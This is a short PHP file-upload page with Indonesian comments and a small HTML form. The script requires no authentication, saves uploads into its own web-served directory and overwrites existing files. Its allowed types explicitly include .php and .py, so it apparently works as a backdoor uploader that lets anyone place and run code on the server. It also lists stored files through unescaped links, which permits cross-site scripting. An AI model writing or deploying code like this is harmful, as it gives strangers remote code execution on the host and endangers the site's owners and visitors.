<?php
// Direktori penyimpanan file
$targetDir = "./";

// Membuat folder jika belum ada
if (!file_exists($targetDir)) {
    mkdir($targetDir, 0777, true);
}

// Proses upload file
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fileName = basename($_FILES["fileToUpload"]["name"]);
    $targetFile = $targetDir . $fileName;
    $fileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));

    // Jenis file yang diperbolehkan
    $allowedTypes = ["jpg", "jpeg", "png", "gif", "pdf", "txt", "docx","php","py"];
    if (!in_array($fileType, $allowedTypes)) {
        echo "<script>alert('Jenis file tidak diperbolehkan!');</script>";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "<script>alert('File berhasil diunggah dan diganti!'); window.location.href='upload.php';</script>";
        } else {
            echo "<script>alert('Terjadi kesalahan saat mengunggah file.');</script>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload File</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        form {
            margin-bottom: 20px;
        }
        input[type="file"] {
            padding: 5px;
        }
        button {
            background: #28a745;
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
        }
        button:hover {
            background: #218838;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li a {
            text-decoration: none;
            color: #007bff;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Upload dan Ganti File</h2>
        
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" required>
            <button type="submit">Upload</button>
        </form>

        <h3>File yang sudah diunggah:</h3>
        <ul>
            <?php
            $files = scandir($targetDir);
            foreach ($files as $file) {
                if ($file != "." && $file != "..") {
                    echo "<li><a href='$targetDir$file' target='_blank'>$file</a></li>";
                }
            }
            ?>
        </ul>
    </div>

</body>
</html>
